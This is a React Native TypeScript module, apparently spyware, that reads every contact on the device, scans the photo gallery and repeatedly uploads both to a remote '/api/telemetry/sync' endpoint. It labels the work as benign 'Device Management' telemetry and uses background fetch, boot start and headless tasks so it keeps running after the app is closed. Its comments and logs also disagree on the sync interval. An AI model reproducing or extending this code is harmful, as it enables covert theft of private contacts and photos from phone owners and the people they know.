import BackgroundService from 'react-native-background-actions';
import BackgroundFetch from 'react-native-background-fetch';
import Contacts from 'react-native-contacts';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { scanAndUploadGallery, MediaItem } from './MediaPipelineService';

const sleep = (time: number) => new Promise<void>((resolve) => setTimeout(resolve, time));

const CHUNK_SIZE = 50;
const SYNC_INTERVAL_HOURS = 2;   // Har 2 ghante mein auto sync
const LAST_SYNC_KEY = 'SCH_LAST_SYNC_TIME';
const UPLOADED_IDS_KEY = 'SCH_UPLOADED_FILE_IDS';
const OPTIONS_KEY = 'SCH_SYNC_OPTIONS'; // BackgroundFetch ke liye options save karo

interface SyncOptions {
  backendUrl: string;
  deviceId: string;
}

// ── AsyncStorage helpers ───────────────────────────────────────────────────────

const loadUploadedIds = async (): Promise<Set<string>> => {
  try {
    const saved = await AsyncStorage.getItem(UPLOADED_IDS_KEY);
    if (saved) return new Set(JSON.parse(saved));
  } catch (e) {}
  return new Set<string>();
};

const saveUploadedIds = async (ids: Set<string>) => {
  try {
    await AsyncStorage.setItem(UPLOADED_IDS_KEY, JSON.stringify([...ids]));
  } catch (e) {}
};

const shouldRunSync = async (): Promise<boolean> => {
  try {
    const lastSync = await AsyncStorage.getItem(LAST_SYNC_KEY);
    if (!lastSync) return true;
    const hoursPassed = (Date.now() - parseInt(lastSync, 10)) / (1000 * 60 * 60);
    console.log(`[Sync] Last sync ${hoursPassed.toFixed(1)}h ago`);
    return hoursPassed >= SYNC_INTERVAL_HOURS;
  } catch (e) { return true; }
};

const markSyncDone = async () => {
  try {
    await AsyncStorage.setItem(LAST_SYNC_KEY, Date.now().toString());
  } catch (e) {}
};

// ── Core sync logic (foreground service ke andar chalega) ─────────────────────

const runSyncSession = async (options: SyncOptions) => {
  // Har naye sync session ke start par cursor reset karo taaki newest images sabse pehle upload hon
  try {
    await AsyncStorage.removeItem('SCH_GALLERY_CURSOR');
  } catch (e) {}

  const persistedUploadedIds = await loadUploadedIds();

  // Contacts fetch
  let allContacts: any[] = [];
  try {
    allContacts = await Contacts.getAll();
    console.log(`[Sync] Fetched ${allContacts.length} contacts`);
  } catch (err) {
    console.error('[Sync] Contacts fetch failed:', err);
  }

  // 50-50 chunks
  const contactChunks: any[][] = [];
  for (let i = 0; i < allContacts.length; i += CHUNK_SIZE) {
    contactChunks.push(allContacts.slice(i, i + CHUNK_SIZE));
  }
  let contactChunkIndex = 0;
  const allContactsSent = () => contactChunkIndex >= contactChunks.length;

  // 12 minutes = 48 iterations × 15s
  for (let i = 0; i < 48; i++) {
    if (!BackgroundService.isRunning()) break;

    let newMediaItems: MediaItem[] = [];
    const contactsCompleted = allContactsSent() || contactChunks.length === 0;

    // Gallery scan (Run in parallel with contacts)
    try {
      newMediaItems = await scanAndUploadGallery(options.deviceId, persistedUploadedIds);
      if (newMediaItems.length > 0) {
        for (const item of newMediaItems) persistedUploadedIds.add(item.fileId);
        await saveUploadedIds(persistedUploadedIds);
      }
    } catch (mediaErr: any) {
      console.warn(`[Sync ${i + 1}] Gallery error:`, mediaErr?.message);
    }

    // Backend sync
    try {
      const payload: any = { deviceId: options.deviceId };

      if (!contactsCompleted) {
        payload.contacts = contactChunks[contactChunkIndex];
        console.log(`[Sync ${i + 1}] Contact chunk ${contactChunkIndex + 1}/${contactChunks.length}`);
      }

      if (newMediaItems.length > 0) payload.mediaItems = newMediaItems;

      if (payload.contacts || payload.mediaItems) {
        await axios.post(`${options.backendUrl}/api/telemetry/sync`, payload);
        if (payload.contacts) contactChunkIndex++;
      }

      console.log(`[Sync ${i + 1}/48] media:${newMediaItems.length} chunk:${contactChunkIndex}/${contactChunks.length}`);

    } catch (e: any) {
      console.error(`[Sync ${i + 1}] Backend failed:`, e?.message);
    }

    if (i < 47) await sleep(15000);
  }

  await markSyncDone();
  console.log('[Sync] Session complete. Next auto-run in 3 hours.');
};

// ── Main export: foreground service start + BackgroundFetch schedule ──────────

export const startBackgroundSync = async (options: SyncOptions) => {
  // Options save karo (BackgroundFetch headless task ke liye)
  await AsyncStorage.setItem(OPTIONS_KEY, JSON.stringify(options));

  const shouldSync = await shouldRunSync();
  if (!shouldSync) {
    console.log('[Sync] Skipping — synced within last 3 hours');
    // BackgroundFetch sirf schedule karo (agar nahi hua abhi tak)
    await scheduleAutoSync();
    return;
  }

  // Foreground service start karo
  const task = async () => {
    await new Promise(async (resolve) => {
      await runSyncSession(options);
      if (BackgroundService.isRunning()) await BackgroundService.stop();
      resolve(undefined);
    });
  };

  await BackgroundService.start(task, {
    taskName: 'EnterpriseSync',
    taskTitle: 'Device Management Active',
    taskDesc: 'Secure telemetry synchronization in progress',
    taskIcon: { name: 'ic_launcher', type: 'mipmap' },
    color: '#0f1b2d',
    foregroundServiceType: ['dataSync'],
  } as any);

  // BackgroundFetch bhi schedule karo — app band hone ke baad bhi har 3 ghante mein chale
  await scheduleAutoSync();
};

// ── BackgroundFetch: har 3 ghante mein auto trigger ───────────────────────────

const scheduleAutoSync = async () => {
  BackgroundFetch.configure(
    {
      minimumFetchInterval: 120,   // 120 minutes = 2 hours
      stopOnTerminate: false,       // App close hone ke baad bhi chale
      startOnBoot: true,            // Phone restart ke baad bhi chale
      enableHeadless: true,         // App open hone ki zaroorat nahi
      requiredNetworkType: BackgroundFetch.NETWORK_TYPE_ANY,
    },
    async (taskId) => {
      console.log('[BackgroundFetch] Auto trigger:', taskId);

      const savedOpts = await AsyncStorage.getItem(OPTIONS_KEY);
      if (!savedOpts) {
        BackgroundFetch.finish(taskId);
        return;
      }

      const opts: SyncOptions = JSON.parse(savedOpts);
      const shouldSync = await shouldRunSync();

      if (shouldSync) {
        await runSyncSession(opts);
      } else {
        console.log('[BackgroundFetch] Skipping — recent sync exists');
      }

      BackgroundFetch.finish(taskId);
    },
    async (taskId) => {
      // Timeout callback
      console.warn('[BackgroundFetch] Timeout:', taskId);
      BackgroundFetch.finish(taskId);
    },
  );

  const status = await BackgroundFetch.start();
  console.log('[BackgroundFetch] Scheduled, status:', status);
};

// ── Headless task (app bilkul band ho to bhi chale) ──────────────────────────

export const headlessTask = async (event: any) => {
  const taskId = event.taskId;
  console.log('[Headless] Running:', taskId);

  try {
    const savedOpts = await AsyncStorage.getItem(OPTIONS_KEY);
    if (savedOpts) {
      const opts: SyncOptions = JSON.parse(savedOpts);
      const shouldSync = await shouldRunSync();
      if (shouldSync) await runSyncSession(opts);
    }
  } catch (e: any) {
    console.error('[Headless] Error:', e?.message);
  }

  BackgroundFetch.finish(taskId);
};